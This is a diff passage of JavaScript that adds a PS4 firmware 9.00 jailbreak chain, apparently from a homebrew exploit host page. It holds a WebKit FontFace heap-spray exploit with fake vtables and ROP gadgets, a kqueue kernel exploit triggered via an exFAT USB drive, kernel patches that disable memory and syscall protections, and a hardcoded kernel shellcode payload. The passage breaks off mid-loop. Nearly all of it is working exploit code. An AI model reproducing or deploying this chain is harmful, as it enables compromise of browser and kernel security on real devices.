+			p.write8(fakeVtable_setjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_setjmp_gadget_two));
+			p.write8(fakeVtable_setjmp.add32(0x10), original_context);
+			p.write8(fakeVtable_setjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_setjmp));
+			p.write8(fakeVtable_setjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_setjmp_gadget_one));
+			p.write8(fakeVtable_longjmp.add32(0x0), fakeVtable_longjmp);
+			p.write8(fakeVtable_longjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_longjmp_gadget_two));
+			p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
+			p.write8(fakeVtable_longjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
+			p.write8(fakeVtable_longjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_longjmp_gadget_one));
+			function launch_chain(chain) {
+				chain.push(window.gadgets["pop rdi"]);
+				chain.push(original_context);
+				chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
+				p.write8(textAreaVtPtr, fakeVtable_setjmp);
+				textArea.scrollLeft = 0x0;
+				p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
+				p.write8(modified_context.add32(0x10), chain.stack);
+				p.write8(modified_context.add32(0x40), p.read8(original_context.add32(0x40)))
+				p.write8(textAreaVtPtr, fakeVtable_longjmp);
+				textArea.scrollLeft = 0x0;
+				p.write8(textAreaVtPtr, textAreaVtable);
+			}
+			var kview = new Uint8Array(0x1000);
+			var kstr = p.leakval(kview).add32(0x10);
+			var orig_kview_buf = p.read8(kstr);
+			p.write8(kstr, window.libKernelBase);
+			p.write4(kstr.add32(8), 0x40000);
+			var countbytes;
+			for(var i = 0; i < 0x40000; i++) {
+				if(kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
+					countbytes = i;
+					break;
+				}
+			}
+			p.write4(kstr.add32(8), countbytes + 32);
+			var dview32 = new Uint32Array(1);
+			var dview8 = new Uint8Array(dview32.buffer);
+			for(var i = 0; i < countbytes; i++) {
+				if(kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
+					dview8[0] = kview[i + 3];
+					dview8[1] = kview[i + 4];
+					dview8[2] = kview[i + 5];
+					dview8[3] = kview[i + 6];
+					var syscallno = dview32[0];
+					window.syscalls[syscallno] = window.libKernelBase.add32(i);
+				}
+			}
+			p.write8(kstr, orig_kview_buf);
+			chain = new rop();
+			if(chain.syscall(20).low == 0) {
+				alert("webkit exploit failed. Try again if your ps4 is on fw 9.00.");
+				while(1);
+			}
+		}
+	
+		function run_hax() {
+			userland();
+			if(chain.syscall(23, 0).low != 0x0) {
+				enableUSB();
+				kernel();
+			} else {
+			setTimeout(hen, 500);
+			}
+		}
+	
+		function kernel() {
+			extra_gadgets();
+			kchain_setup();
+			object_setup();
+			trigger_spray();
+		}
+		var handle;
+		var random_path;
+		var ex_info;
+	
+		function load_prx(name) {
+			var res = chain.syscall(594, p.stringify(`/${random_path}/common/lib/${name}`), 0x0, handle, 0x0);
+			if(res.low != 0x0) {
+				alert("failed to load prx/get handle " + name);
+			}
+			p.write8(ex_info, 0x1A8);
+			res = chain.syscall(608, p.read4(handle), 0x0, ex_info);
+			if(res.low != 0x0) {
+				alert("failed to get module info from handle");
+			}
+			var tlsinit = p.read8(ex_info.add32(0x110));
+			var tlssize = p.read4(ex_info.add32(0x11C));
+			if(tlssize != 0) {
+				if(name == "libSceWebKit2.sprx") {
+					tlsinit.sub32inplace(OFFSET_WK2_TLS_IMAGE);
+				} else {
+					alert(`${name}, tlssize is non zero. this usually indicates that this module has a tls phdr with real data. You can hardcode the imgage to base offset here if you really wish to use one of these.`);
+				}
+			}
+			return tlsinit;
+		}
+		function extra_gadgets() {
+			handle = p.malloc(0x1E8);
+			var randomized_path_length_ptr = handle.add32(0x4);
+			var randomized_path_ptr = handle.add32(0x14);
+			ex_info = randomized_path_ptr.add32(0x40);
+			p.write8(randomized_path_length_ptr, 0x2C);
+			chain.syscall(602, 0, randomized_path_ptr, randomized_path_length_ptr);
+			random_path = p.readstr(randomized_path_ptr);
+			var ipmi_addr = load_prx("libSceIpmi.sprx");
+			var hmd_addr = load_prx("libSceHmd.sprx");
+			var wk2_addr = load_prx("libSceWebKit2.sprx");
+			for(var gadget in hmd_gadgetmap) {
+				window.gadgets[gadget] = hmd_addr.add32(hmd_gadgetmap[gadget]);
+			}
+			for(var gadget in wk2_gadgetmap) {
+				window.gadgets[gadget] = wk2_addr.add32(wk2_gadgetmap[gadget]);
+			}
+			for(var gadget in ipmi_gadgetmap) {
+				window.gadgets[gadget] = ipmi_addr.add32(ipmi_gadgetmap[gadget]);
+			}
+			for(var gadget in window.gadgets) {
+				p.read8(window.gadgets[gadget]);
+				chain.fcall(window.syscalls[203], window.gadgets[gadget], 0x10);
+			}
+			chain.run();
+		}
+		function kchain_setup() {
+			const KERNEL_busy = 0x1B28DF8;
+			const KERNEL_bcopy = 0xACD;
+			const KERNEL_bzero = 0x2713FD;
+			const KERNEL_pagezero = 0x271441;
+			const KERNEL_memcpy = 0x2714BD;
+			const KERNEL_pagecopy = 0x271501;
+			const KERNEL_copyin = 0x2716AD;
+			const KERNEL_copyinstr = 0x271B5D;
+			const KERNEL_copystr = 0x271C2D;
+			const KERNEL_setidt = 0x312c40;
+			const KERNEL_setcr0 = 0x1FB949;
+			const KERNEL_Xill = 0x17d500;
+			const KERNEL_veriPatch = 0x626874;
+			const KERNEL_enable_syscalls_1 = 0x490;
+			const KERNEL_enable_syscalls_2 = 0x4B5;
+			const KERNEL_enable_syscalls_3 = 0x4B9;
+			const KERNEL_enable_syscalls_4 = 0x4C2;
+			const KERNEL_mprotect = 0x80B8D;
+			const KERNEL_prx = 0x23AEC4;
+			const KERNEL_dlsym_1 = 0x23B67F;
+			const KERNEL_dlsym_2 = 0x221b40;
+			const KERNEL_setuid = 0x1A06;
+			const KERNEL_syscall11_1 = 0x1100520;
+			const KERNEL_syscall11_2 = 0x1100528;
+			const KERNEL_syscall11_3 = 0x110054C;
+			const KERNEL_syscall11_gadget = 0x4c7ad;
+			const KERNEL_mmap_1 = 0x16632A;
+			const KERNEL_mmap_2 = 0x16632D;
+			const KERNEL_setcr0_patch = 0x3ade3B;
+			const KERNEL_kqueue_close_epi = 0x398991;
+			SAVED_KERNEL_STACK_PTR = p.malloc(0x200);
+			KERNEL_BASE_PTR = SAVED_KERNEL_STACK_PTR.add32(0x8);
+			p.write8(KERNEL_BASE_PTR, new int64(0xFF80E364, 0xFFFFFFFF));
+			kchain = new rop();
+			kchain2 = new rop();
+			{
+				chain.fcall(window.syscalls[203], kchain.stackback, 0x40000);
+				chain.fcall(window.syscalls[203], kchain2.stackback, 0x40000);
+				chain.fcall(window.syscalls[203], SAVED_KERNEL_STACK_PTR, 0x10);
+			}
+			chain.run();
+			kchain.count = 0;
+			kchain2.count = 0;
+			kchain.set_kernel_var(KERNEL_BASE_PTR);
+			kchain2.set_kernel_var(KERNEL_BASE_PTR);
+			kchain.push(gadgets["pop rax"]);
+			kchain.push(SAVED_KERNEL_STACK_PTR);
+			kchain.push(gadgets["mov [rax], rdi"]);
+			kchain.push(gadgets["pop r8"]);
+			kchain.push(KERNEL_BASE_PTR);
+			kchain.push(gadgets["add [r8], r12"]);
+			kchain.kwrite1(KERNEL_busy, 0x1);
+			kchain.push(gadgets["sti"]);
+			var idx1 = kchain.write_kernel_addr_to_chain_later(KERNEL_setidt);
+			var idx2 = kchain.write_kernel_addr_to_chain_later(KERNEL_setcr0);
+			kchain.push(gadgets["pop rdi"]);
+			kchain.push(0x6);
+			kchain.push(gadgets["pop rsi"]);
+			kchain.push(gadgets["mov rsp, rdi"]);
+			kchain.push(gadgets["pop rdx"]);
+			kchain.push(0xE);
+			kchain.push(gadgets["pop rcx"]);
+			kchain.push(0x0);
+			kchain.push(gadgets["pop r8"]);
+			kchain.push(0x0);
+			var idx1_dest = kchain.get_rsp();
+			kchain.pushSymbolic();
+			kchain.push(gadgets["pop rsi"]);
+			kchain.push(0x80040033);
+			kchain.push(gadgets["pop rdi"]);
+			kchain.push(kchain2.stack);
+			var idx2_dest = kchain.get_rsp();
+			kchain.pushSymbolic();
+			kchain.finalizeSymbolic(idx1, idx1_dest);
+			kchain.finalizeSymbolic(idx2, idx2_dest);
+			kchain2.kwrite2(KERNEL_veriPatch, 0x9090);
+			kchain2.kwrite1(KERNEL_bcopy, 0xEB);
+			kchain2.kwrite1(KERNEL_bzero, 0xEB);
+			kchain2.kwrite1(KERNEL_pagezero, 0xEB);
+			kchain2.kwrite1(KERNEL_memcpy, 0xEB);
+			kchain2.kwrite1(KERNEL_pagecopy, 0xEB);
+			kchain2.kwrite1(KERNEL_copyin, 0xEB);
+			kchain2.kwrite1(KERNEL_copyinstr, 0xEB);
+			kchain2.kwrite1(KERNEL_copystr, 0xEB);
+			kchain2.kwrite1(KERNEL_busy, 0x0); 
+			var idx3 = kchain2.write_kernel_addr_to_chain_later(KERNEL_Xill);
+			var idx4 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setidt);
+			kchain2.push(gadgets["pop rdi"]);
+			kchain2.push(0x6);
+			kchain2.push(gadgets["pop rsi"]);
+			var idx3_dest = kchain2.get_rsp();
+			kchain2.pushSymbolic();
+			kchain2.push(gadgets["pop rdx"]);
+			kchain2.push(0xE);
+			kchain2.push(gadgets["pop rcx"]);
+			kchain2.push(0x0);
+			kchain2.push(gadgets["pop r8"]);
+			kchain2.push(0x0);
+			var idx4_dest = kchain2.get_rsp();
+			kchain2.pushSymbolic(); 
+			kchain2.finalizeSymbolic(idx3, idx3_dest);
+			kchain2.finalizeSymbolic(idx4, idx4_dest);
+			kchain2.kwrite4(KERNEL_enable_syscalls_1, 0x00000000);
+			kchain2.kwrite1(KERNEL_enable_syscalls_4, 0xEB);
+			kchain2.kwrite2(KERNEL_enable_syscalls_3, 0x9090);
+			kchain2.kwrite2(KERNEL_enable_syscalls_2, 0x9090);
+			kchain2.kwrite1(KERNEL_setuid, 0xEB);
+			kchain2.kwrite4(KERNEL_mprotect, 0x00000000);
+			kchain2.kwrite2(KERNEL_prx, 0xE990);
+			kchain2.kwrite1(KERNEL_dlsym_1, 0xEB);
+			kchain2.kwrite4(KERNEL_dlsym_2, 0xC3C03148);
+			kchain2.kwrite1(KERNEL_mmap_1, 0x37);
+			kchain2.kwrite1(KERNEL_mmap_2, 0x37);
+			kchain2.kwrite4(KERNEL_syscall11_1, 0x00000002);
+			kchain2.kwrite8_kaddr(KERNEL_syscall11_2, KERNEL_syscall11_gadget);
+			kchain2.kwrite4(KERNEL_syscall11_3, 0x00000001);
+			kchain2.kwrite4(KERNEL_setcr0_patch, 0xC3C7220F);
+			var idx5 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setcr0_patch);
+			kchain2.push(gadgets["pop rdi"]);
+			kchain2.push(0x80050033);
+			var idx5_dest = kchain2.get_rsp();
+			kchain2.pushSymbolic(); 
+			kchain2.finalizeSymbolic(idx5, idx5_dest);
+			kchain2.rax_kernel(KERNEL_kqueue_close_epi);
+			kchain2.push(gadgets["mov rdx, rax"]);
+			kchain2.push(gadgets["pop rsi"]);
+			kchain2.push(SAVED_KERNEL_STACK_PTR);
+			kchain2.push(gadgets["mov rax, [rsi]"]);
+			kchain2.push(gadgets["pop rcx"]);
+			kchain2.push(0x10);
+			kchain2.push(gadgets["add rax, rcx"]);
+			kchain2.push(gadgets["mov [rax], rdx"]);
+			kchain2.push(gadgets["pop rdi"]);
+			var idx6 = kchain2.pushSymbolic();
+			kchain2.push(gadgets["mov [rdi], rax"]);
+			kchain2.push(gadgets["sti"]);
+			kchain2.push(gadgets["pop rsp"]);
+			var idx6_dest = kchain2.get_rsp();
+			kchain2.pushSymbolic(); 
+			kchain2.finalizeSymbolic(idx6, idx6_dest);
+		}
+	
+		function object_setup() {
+			var fake_knote = chain.syscall(477, 0x4000, 0x4000 * 0x3, 0x3, 0x1010, 0xFFFFFFFF, 0x0);
+			var fake_filtops = fake_knote.add32(0x4000);
+			var fake_obj = fake_knote.add32(0x8000);
+			if(fake_knote.low != 0x4000) {
+				alert("enomem: " + fake_knote);
+				while(1);
+			}
+			{
+				p.write8(fake_knote, fake_obj);
+				p.write8(fake_knote.add32(0x68), fake_filtops)
+			}
+			{
+				p.write8(fake_filtops.sub32(0x79), gadgets["cli ; pop rax"]); 
+				p.write8(fake_filtops.add32(0x0), gadgets["xchg rdi, rsp ; call [rsi - 0x79]"]); 
+				p.write8(fake_filtops.add32(0x8), kchain.stack);
+				p.write8(fake_filtops.add32(0x10), gadgets["mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]"]); 
+			}
+			{
+				p.write8(fake_obj.add32(0x30), gadgets["mov rdi, [rax + 8] ; call [rax]"]);
+			}
+			chain.syscall(203, fake_knote, 0xC000);
+		}
+		var trigger_spray = function() {
+			var NUM_KQUEUES = 0x1B0;
+			var kqueue_ptr = p.malloc(NUM_KQUEUES * 0x4);
+			{
+				for(var i = 0; i < NUM_KQUEUES; i++) {
+					chain.fcall(window.syscalls[362]);
+					chain.write_result4(kqueue_ptr.add32(0x4 * i));
+				}
+			}
+			chain.run();
+			var kqueues = p.array_from_address(kqueue_ptr, NUM_KQUEUES);
+			var that_one_socket = chain.syscall(97, 2, 1, 0);
+			if(that_one_socket.low < 0x100 || that_one_socket.low >= 0x200) {
+				alert("invalid socket");
+				while(1);
+			}
+			var kevent = p.malloc(0x20);
+			p.write8(kevent.add32(0x0), that_one_socket);
+			p.write4(kevent.add32(0x8), 0xFFFF + 0x010000);
+			p.write4(kevent.add32(0xC), 0x0);
+			p.write8(kevent.add32(0x10), 0x0);
+			p.write8(kevent.add32(0x18), 0x0);
+			{
+				for(var i = 0; i < NUM_KQUEUES; i++) {
+					chain.fcall(window.syscalls[363], kqueues[i], kevent, 0x1, 0x0, 0x0, 0x0);
+				}
+			}
+			chain.run();
+			{
+				for(var i = 18; i < NUM_KQUEUES; i += 2) {
+					chain.fcall(window.syscalls[6], kqueues[i]);
+				}
+			}
+			chain.run();
+			window.progress.innerHTML = "Activating ExFatHax USB...";
+			usbWaitTime=1*USBWait();
+			sleep(usbWaitTime).then(() => {
+				{
+					for(var i = 1; i < NUM_KQUEUES; i += 2) {
+						chain.fcall(window.syscalls[6], kqueues[i]);
+					}
+				}
+				chain.run();
+				if(chain.syscall(23, 0).low == 0) {
+					chain.fcall(window.syscalls[73], 0x4000, 0xC000);
+					chain.fcall(window.syscalls[325]);
+					chain.run();
+					var patch_buffer = chain.syscall(477, 0x0, 0x4000, 0x7, 0x1000, 0xFFFFFFFF, 0);
+					var patch_buffer_view = p.array_from_address(patch_buffer, 0x1000);
+					patch_buffer_view[0] = 0x00000BB8;
+					patch_buffer_view[1] = 0xFE894800;
+					patch_buffer_view[2] = 0x033D8D48;
+					patch_buffer_view[3] = 0x0F000000;
+					patch_buffer_view[4] = 0x4855C305;
+					patch_buffer_view[5] = 0x8B48E589;
+					patch_buffer_view[6] = 0x95E8087E;
+					patch_buffer_view[7] = 0xE8000000;
+					patch_buffer_view[8] = 0x00000175;
+					patch_buffer_view[9] = 0x033615FF;
+					patch_buffer_view[10] = 0x8B480000;
+					patch_buffer_view[11] = 0x0003373D;
+					patch_buffer_view[12] = 0x3F8B4800;
+					patch_buffer_view[13] = 0x74FF8548;
+					patch_buffer_view[14] = 0x3D8D48EB;
+					patch_buffer_view[15] = 0x0000029D;
+					patch_buffer_view[16] = 0xF9358B48;
+					patch_buffer_view[17] = 0x48000002;
+					patch_buffer_view[18] = 0x0322158B;
+					patch_buffer_view[19] = 0x8B480000;
+					patch_buffer_view[20] = 0x00D6E812;
+					patch_buffer_view[21] = 0x8D480000;
+					patch_buffer_view[22] = 0x00029F3D;
+					patch_buffer_view[23] = 0x358B4800;
+					patch_buffer_view[24] = 0x000002E4;
+					patch_buffer_view[25] = 0x05158B48;
+					patch_buffer_view[26] = 0x48000003;
+					patch_buffer_view[27] = 0xB9E8128B;
+					patch_buffer_view[28] = 0x48000000;
+					patch_buffer_view[29] = 0x02633D8D;
+					patch_buffer_view[30] = 0x8B480000;
+					patch_buffer_view[31] = 0x0002BF35;
+					patch_buffer_view[32] = 0x158B4800;
+					patch_buffer_view[33] = 0x000002C8;
+					patch_buffer_view[34] = 0xE8128B48;
+					patch_buffer_view[35] = 0x0000009C;
+					patch_buffer_view[36] = 0x7A3D8D48;
+					patch_buffer_view[37] = 0x48000002;
+					patch_buffer_view[38] = 0x02AA358B;
+					patch_buffer_view[39] = 0x8B480000;
+					patch_buffer_view[40] = 0x0002AB15;
+					patch_buffer_view[41] = 0x128B4800;
+					patch_buffer_view[42] = 0x00007FE8;
+					patch_buffer_view[43] = 0x0185E800;
+					patch_buffer_view[44] = 0xC35D0000;
+					patch_buffer_view[45] = 0x6D3D8948;
+					patch_buffer_view[46] = 0x48000002;
+					patch_buffer_view[47] = 0x026E3D01;
+					patch_buffer_view[48] = 0x01480000;
+					patch_buffer_view[49] = 0x00026F3D;
+					patch_buffer_view[50] = 0x3D014800;
+					patch_buffer_view[51] = 0x00000270;
+					patch_buffer_view[52] = 0x713D0148;
+					patch_buffer_view[53] = 0x48000002;
+					patch_buffer_view[54] = 0x02723D01;
+					patch_buffer_view[55] = 0x01480000;
+					patch_buffer_view[56] = 0x0002933D;
+					patch_buffer_view[57] = 0x3D014800;
+					patch_buffer_view[58] = 0x00000294;
+					patch_buffer_view[59] = 0x653D0148;
+					patch_buffer_view[60] = 0x48000002;
+					patch_buffer_view[61] = 0x02663D01;
+					patch_buffer_view[62] = 0x01480000;
+					patch_buffer_view[63] = 0x0002873D;
+					patch_buffer_view[64] = 0x3D014800;
+					patch_buffer_view[65] = 0x00000288;
+					patch_buffer_view[66] = 0x893D0148;
+					patch_buffer_view[67] = 0x48000002;
+					patch_buffer_view[68] = 0x028A3D01;
+					patch_buffer_view[69] = 0x01480000;
+					patch_buffer_view[70] = 0x00028B3D;
+					patch_buffer_view[71] = 0x3D014800;
+					patch_buffer_view[72] = 0x0000024C;
+					patch_buffer_view[73] = 0x3D3D0148;
+					patch_buffer_view[74] = 0xC3000002;
+					patch_buffer_view[75] = 0xE5894855;
+					patch_buffer_view[76] = 0x10EC8348;
+					patch_buffer_view[77] = 0x24348948;
+					patch_buffer_view[78] = 0x24548948;
+					patch_buffer_view[79] = 0xED15FF08;
+					patch_buffer_view[80] = 0x48000001;
+					patch_buffer_view[81] = 0x4B74C085;
+					patch_buffer_view[82] = 0x48C28948;
+					patch_buffer_view[83] = 0x4840408B;
+					patch_buffer_view[84] = 0x2F74C085;
+					patch_buffer_view[85] = 0x28788B48;
+					patch_buffer_view[86] = 0x243C3B48;
+					patch_buffer_view[87] = 0x8B480A74;
+					patch_buffer_view[88] = 0xC0854800;
+					patch_buffer_view[89] = 0xECEB1D74;
+					patch_buffer_view[90] = 0x18788B48;
+					patch_buffer_view[91] = 0x74FF8548;
+					patch_buffer_view[92] = 0x7F8B48ED;
+					patch_buffer_view[93] = 0x7C3B4810;
+					patch_buffer_view[94] = 0xE2750824;
+					patch_buffer_view[95] = 0xFF1040C7;
+					patch_buffer_view[96] = 0x48FFFFFF;
+					patch_buffer_view[97] = 0x31107A8D;
+					patch_buffer_view[98] = 0x31D231F6;
+					patch_buffer_view[99] = 0xA515FFC9;
+					patch_buffer_view[100] = 0x48000001;
+					patch_buffer_view[101] = 0x5D10C483;
+					patch_buffer_view[102] = 0x894855C3;
+					patch_buffer_view[103] = 0xC0200FE5;
+					patch_buffer_view[104] = 0xFFFF2548;
+					patch_buffer_view[105] = 0x220FFFFE;
+					patch_buffer_view[106] = 0x3D8B48C0;
+					patch_buffer_view[107] = 0x000001C8;
+					patch_buffer_view[108] = 0x909007C7;
+					patch_buffer_view[109] = 0x47C79090;
+					patch_buffer_view[110] = 0x48909004;
+					patch_buffer_view[111] = 0x358B48B8;
+					patch_buffer_view[112] = 0x000001AC;
+					patch_buffer_view[113] = 0x08778948;
+					patch_buffer_view[114] = 0x651047C7;
+					patch_buffer_view[115] = 0xC73C8B48;
+					patch_buffer_view[116] = 0x00251447;
+					patch_buffer_view[117] = 0x47C70000;
+					patch_buffer_view[118] = 0x89480018;
+					patch_buffer_view[119] = 0x1C47C738;
+					patch_buffer_view[120] = 0xB8489090;
+					patch_buffer_view[121] = 0x7D358B48;
+					patch_buffer_view[122] = 0x48000001;
+					patch_buffer_view[123] = 0xC7207789;
+					patch_buffer_view[124] = 0xC7482847;
+					patch_buffer_view[125] = 0x47C70100;
+					patch_buffer_view[126] = 0x0000002C;
+					patch_buffer_view[127] = 0x778D48E9;
+					patch_buffer_view[128] = 0x158B4834;
+					patch_buffer_view[129] = 0x00000150;
+					patch_buffer_view[130] = 0x89F22948;
+					patch_buffer_view[131] = 0x8B483057;
+					patch_buffer_view[132] = 0x00016B35;
+					patch_buffer_view[133] = 0x568D4800;
+					patch_buffer_view[134] = 0xD7294805;
+					patch_buffer_view[135] = 0xC148FF89;
+					patch_buffer_view[136] = 0x814808E7;
+					patch_buffer_view[137] = 0x0000E9CF;
+					patch_buffer_view[138] = 0x3E894800;
+					patch_buffer_view[139] = 0x00000D48;
+					patch_buffer_view[140] = 0x220F0001;
+					patch_buffer_view[141] = 0x55C35DC0;
+					patch_buffer_view[142] = 0x0FE58948;
+					patch_buffer_view[143] = 0x2548C020;
+					patch_buffer_view[144] = 0xFFFEFFFF;
+					patch_buffer_view[145] = 0x48C0220F;
+					patch_buffer_view[146] = 0x013A3D8B;
+					patch_buffer_view[147] = 0x07C70000;
+					patch_buffer_view[148] = 0x00C3C031;
+					patch_buffer_view[149] = 0x353D8B48;
+					patch_buffer_view[150] = 0xC7000001;
+					patch_buffer_view[151] = 0xC3C03107;
+					patch_buffer_view[152] = 0x3D8B4800;
+					patch_buffer_view[153] = 0x00000130;
+					patch_buffer_view[154] = 0xC03107C7;
+					patch_buffer_view[155] = 0x8B4800C3;
+					patch_buffer_view[156] = 0x00012B3D;
+					patch_buffer_view[157] = 0x3107C700;
+					patch_buffer_view[158] = 0x4800C3C0;
+					patch_buffer_view[159] = 0x00A63D8B;
+					patch_buffer_view[160] = 0x87C70000;
+					patch_buffer_view[161] = 0x001F1E01;
+					patch_buffer_view[162] = 0x9090F631;
+					patch_buffer_view[163] = 0x1E0587C7;
+					patch_buffer_view[164] = 0xC931001F;
+					patch_buffer_view[165] = 0x87C79090;
+					patch_buffer_view[166] = 0x001F1E09;
+					patch_buffer_view[167] = 0x9090D231;
+					patch_buffer_view[168] = 0x1E3E87C7;
+					patch_buffer_view[169] = 0xC931001F;
+					patch_buffer_view[170] = 0x0D489090;
+					patch_buffer_view[171] = 0x00010000;
+					patch_buffer_view[172] = 0xFFC0220F;
+					patch_buffer_view[173] = 0x0000EF15;
+					patch_buffer_view[174] = 0xC0200F00;
+					patch_buffer_view[175] = 0xFFFF2548;
+					patch_buffer_view[176] = 0x220FFFFE;
+					patch_buffer_view[177] = 0x3D8B48C0;
+					patch_buffer_view[178] = 0x000000DC;
+					patch_buffer_view[179] = 0xC03107C7;
+					patch_buffer_view[180] = 0x0D4800C3;
+					patch_buffer_view[181] = 0x00010000;
+					patch_buffer_view[182] = 0x5DC0220F;
+					patch_buffer_view[183] = 0x737973C3;
+					patch_buffer_view[184] = 0x5F6D6574;
+					patch_buffer_view[185] = 0x70737573;
+					patch_buffer_view[186] = 0x5F646E65;
+					patch_buffer_view[187] = 0x73616870;
+					patch_buffer_view[188] = 0x705F3265;
+					patch_buffer_view[189] = 0x735F6572;
+					patch_buffer_view[190] = 0x00636E79;
+					patch_buffer_view[191] = 0x74737973;
+					patch_buffer_view[192] = 0x725F6D65;
+					patch_buffer_view[193] = 0x6D757365;
+					patch_buffer_view[194] = 0x68705F65;
+					patch_buffer_view[195] = 0x32657361;
+					patch_buffer_view[196] = 0x73797300;
+					patch_buffer_view[197] = 0x5F6D6574;
+					patch_buffer_view[198] = 0x75736572;
+					patch_buffer_view[199] = 0x705F656D;
+					patch_buffer_view[200] = 0x65736168;
+					patch_buffer_view[201] = 0x90900033;
+					patch_buffer_view[202] = 0x00000000;
+					patch_buffer_view[203] = 0x00000000;
+					patch_buffer_view[204] = 0x000F88F0;
+					patch_buffer_view[205] = 0x00000000;
+					patch_buffer_view[206] = 0x002EF170;
+					patch_buffer_view[207] = 0x00000000;
+					patch_buffer_view[208] = 0x00018DF0;
+					patch_buffer_view[209] = 0x00000000;
+					patch_buffer_view[210] = 0x00018EF0;
+					patch_buffer_view[211] = 0x00000000;
+					patch_buffer_view[212] = 0x02654110;
+					patch_buffer_view[213] = 0x00000000;
+					patch_buffer_view[214] = 0x00097230;
+					patch_buffer_view[215] = 0x00000000;
+					patch_buffer_view[216] = 0x00402E60;
+					patch_buffer_view[217] = 0x00000000;
+					patch_buffer_view[218] = 0x01520108;
+					patch_buffer_view[219] = 0x00000000;
+					patch_buffer_view[220] = 0x01520100;
+					patch_buffer_view[221] = 0x00000000;
+					patch_buffer_view[222] = 0x00462D20;
+					patch_buffer_view[223] = 0x00000000;
+					patch_buffer_view[224] = 0x00462DFC;
+					patch_buffer_view[225] = 0x00000000;
+					patch_buffer_view[226] = 0x006259A0;
+					patch_buffer_view[227] = 0x00000000;
+					patch_buffer_view[228] = 0x006268D0;
+					patch_buffer_view[229] = 0x00000000;
+					patch_buffer_view[230] = 0x00625DC0;
+					patch_buffer_view[231] = 0x00000000;
+					patch_buffer_view[232] = 0x00626290;
+					patch_buffer_view[233] = 0x00000000;
+					patch_buffer_view[234] = 0x00626720;
+					patch_buffer_view[235] = 0x00000000; 
+					{
+						chain.fcall(window.syscalls[203], patch_buffer, 0x4000);
+						chain.fcall(patch_buffer, p.read8(KERNEL_BASE_PTR));
+						chain.fcall(window.syscalls[73], patch_buffer, 0x4000);
+					}
+					chain.run();
+					setTimeout(hen, 500);
+				} else {
+					disableUSB();
+					alert("Failed. Please try again");
+					p.write8(0, 0);
+				}
+			});
+		}
+		var PAGE_SIZE = 16384;
+		var SIZEOF_CSS_FONT_FACE = 0xb8;
+		var HASHMAP_BUCKET = 208;
+		var STRING_OFFSET = 20;
+		var SPRAY_FONTS = 0x100a;
+		var GUESS_FONT = 8602845184;
+		var NPAGES = 20;
+		var INVALID_POINTER = 0;
+		var HAMMER_FONT_NAME = "font8";
+		var HAMMER_NSTRINGS = 700;
+		function poc() {
+			function hex(n) {
+				if((typeof n) != "number") return "" + n;
+				return "0x" + (new Number(n)).toString(16);
+			}
+			var union = new ArrayBuffer(8);
+			var union_b = new Uint8Array(union);
+			var union_i = new Uint32Array(union);
+			var union_f = new Float64Array(union);
+			var bad_fonts = [];
+			for(var i = 0; i < SPRAY_FONTS; i++) bad_fonts.push(new FontFace("font1", "", {}));
+			var good_font = new FontFace("font2", "url(data:text/html,)", {});
+			bad_fonts.push(good_font);
+			var arrays = [];
+			for(var i = 0; i < 512; i++) arrays.push(new Array(31));
+			arrays[256][0] = 1.5;
+			arrays[257][0] = {};
+			arrays[258][0] = 1.5;
+			var jsvalue = {
+				a: arrays[256],
+				b: new Uint32Array(1),
+				c: true
+			};
+			var string_atomifier = {};
+			var string_id = 10000000;
+	
+			function ptrToString(p) {
+				var s = '';
+				for(var i = 0; i < 8; i++) {
+					s += String.fromCharCode(p % 256);
+					p = (p - p % 256) / 256;
+				}
+				return s;
+			}
+	
+			function stringToPtr(p, o) {
+				if(o === undefined) o = 0;
+				var ans = 0;
+				for(var i = 7; i >= 0; i--) ans = 256 * ans + p.charCodeAt(o + i);
+				return ans;
+			}
+			var strings = [];
+	
+			function mkString(l, head) {
+				var s = head + '\u0000'.repeat(l - STRING_OFFSET - 8 - head.length) + (string_id++);
+				string_atomifier[s] = 1;
+				strings.push(s);
+				return s;
+			}
+			var guf = GUESS_FONT;
+			var ite = true;
+			var matches = 0;
+			var round = 0;
+			window.ffses = {};
+			do {
+				var p_s = ptrToString(NPAGES + 2);
+				for(var i = 0; i < NPAGES; i++) p_s += ptrToString(guf + i * PAGE_SIZE);
+				p_s += ptrToString(INVALID_POINTER);
+				for(var i = 0; i < 256; i++) mkString(HASHMAP_BUCKET, p_s);
+				var ffs = ffses["search_" + (++round)] = new FontFaceSet(bad_fonts);
+				var badstr1 = mkString(HASHMAP_BUCKET, p_s);
+				var guessed_font = null;
+				var guessed_addr = null;
+				for(var i = 0; i < SPRAY_FONTS; i++) {
+					bad_fonts[i].family = "search" + round;
+					if(badstr1.substr(0, p_s.length) != p_s) {
+						guessed_font = i;
+						var p_s1 = badstr1.substr(0, p_s.length);
+						for(var i = 1; i <= NPAGES; i++) {
+							if(p_s1.substr(i * 8, 8) != p_s.substr(i * 8, 8)) {
+								guessed_addr = stringToPtr(p_s.substr(i * 8, 8));
+								break;
+							}
+						}
+						if(matches++ == 0) {
+							guf = guessed_addr + 2 * PAGE_SIZE;
+							guessed_addr = null;
+						}
+						break;
+					}
+				}
+				if((ite = !ite)) guf += NPAGES * PAGE_SIZE;
+			}
+			while(guessed_addr === null);
+			var p_s = '';
+			p_s += ptrToString(26);
+			p_s += ptrToString(guessed_addr);
+			p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
+			for(var i = 0; i < 19; i++) p_s += ptrToString(INVALID_POINTER);
+			for(var i = 0; i < 256; i++) mkString(HASHMAP_BUCKET, p_s);
+			var needfix = [];
+			for(var i = 0;; i++) {
